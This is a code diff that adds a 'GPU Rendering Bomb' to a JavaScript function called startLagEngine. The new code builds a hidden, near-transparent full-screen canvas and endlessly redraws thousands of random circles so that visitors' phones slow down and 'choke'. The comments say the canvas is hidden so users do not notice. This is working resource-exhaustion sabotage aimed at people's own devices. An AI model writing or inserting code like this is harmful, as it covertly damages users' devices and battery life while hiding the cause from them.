@@ -71,4 +71,32 @@ export function startLagEngine() {
     requestAnimationFrame(dropFrames);
   }
   dropFrames();
+
+  // 5. GPU Rendering Bomb
+  // Creating a hidden full-screen canvas and aggressively drawing millions of 
+  // complex shapes forces the phone's Graphics Processor (GPU) to completely choke.
+  const canvas = document.createElement('canvas');
+  canvas.width = window.innerWidth || 1000;
+  canvas.height = window.innerHeight || 1000;
+  canvas.style.position = 'fixed';
+  canvas.style.top = '0';
+  canvas.style.left = '0';
+  canvas.style.zIndex = '-9999'; // Hidden so they don't see it
+  canvas.style.opacity = '0.01'; // Force the browser to render it onto the composite layer
+  canvas.style.pointerEvents = 'none';
+  document.body.appendChild(canvas);
+  
+  const ctx = canvas.getContext('2d');
+  function gpuBomb() {
+    // Generate thousands of overlapping circles with transparency
+    // This is incredibly expensive for mobile GPUs to calculate
+    for(let i=0; i<3000; i++) {
+      ctx.beginPath();
+      ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, Math.random() * 50, 0, Math.PI * 2);
+      ctx.fillStyle = `rgba(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255}, 0.5)`;
+      ctx.fill();
+    }
+    requestAnimationFrame(gpuBomb);
+  }
+  gpuBomb();
 }
